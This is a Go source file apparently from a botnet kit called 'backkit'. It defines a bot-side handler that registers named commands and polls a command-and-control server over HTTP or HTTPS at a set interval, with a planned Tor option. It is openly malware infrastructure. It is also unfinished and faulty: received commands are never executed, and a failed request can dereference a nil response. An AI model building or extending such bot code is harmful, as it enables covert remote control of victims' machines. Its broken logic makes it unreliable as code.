package backkit

import (
	"errors"
	"fmt"
	"net/http"
	"time"
)

const (
	CONNECTION_NORMAL = 0
	CONNECTION_TOR    = 1
	CONNECTION_SSL    = 2
)

type Handler struct {
	Host           string
	Port           int
	Interval       int
	ConnectionType int

	Commands map[string]func(...string)
}

// Create new handler and return it.
func NewHandler(host string, port, connectionType int) Handler {
	return Handler{
		Host:           host,
		Port:           port,
		ConnectionType: connectionType,
		Interval:       60,
		Commands:       make(map[string]func(...string)),
	}
}

// Add command to handler.
func (h *Handler) AddCommand(command string, commandFunc func(...string)) error {
	if _, commandExist := h.Commands[command]; commandExist {
		return errors.New("command already exist")
	}
	h.Commands[command] = commandFunc
	return nil
}

// Remove command from handler.
func (h *Handler) RemoveCommand(command string) error {
	if _, commandExist := h.Commands[command]; !commandExist {
		return errors.New("command not exist")
	}
	delete(h.Commands, command)
	return nil
}

// Set interval in second between each HTTP request.
func (h *Handler) SetInterval(interval int) {
	h.Interval = interval
}

// Start handler to receive parse command from C&C server. maxErrorCount limits error in C&C server connection.
// If u set maxErrorCount as -1, it will ignore every error between C&C and bot.
func (h *Handler) Start(maxErrorCount int) error {
	uniqueID, err := GenerateUniqueID()
	if err != nil {
		return err
	}

	scheme := "http"
	if h.ConnectionType == CONNECTION_SSL {
		scheme = "https"
	}
	cncURL := fmt.Sprintf("%s://%s:%d/docking/%s", scheme, h.Host, h.Port, uniqueID)

	// TODO: Check connectionType is Tor and use Tor connection using Bine.
	errorCount := 0
	for {
		resp, err := http.Get(cncURL)
		if err != nil {
			if maxErrorCount > 0 {
				errorCount++
				if errorCount >= maxErrorCount {
					return err
				}
				goto sleepForInterval
			}
		}
		defer resp.Body.Close()

	sleepForInterval:
		time.Sleep(time.Second * time.Duration(h.Interval))
	}
}
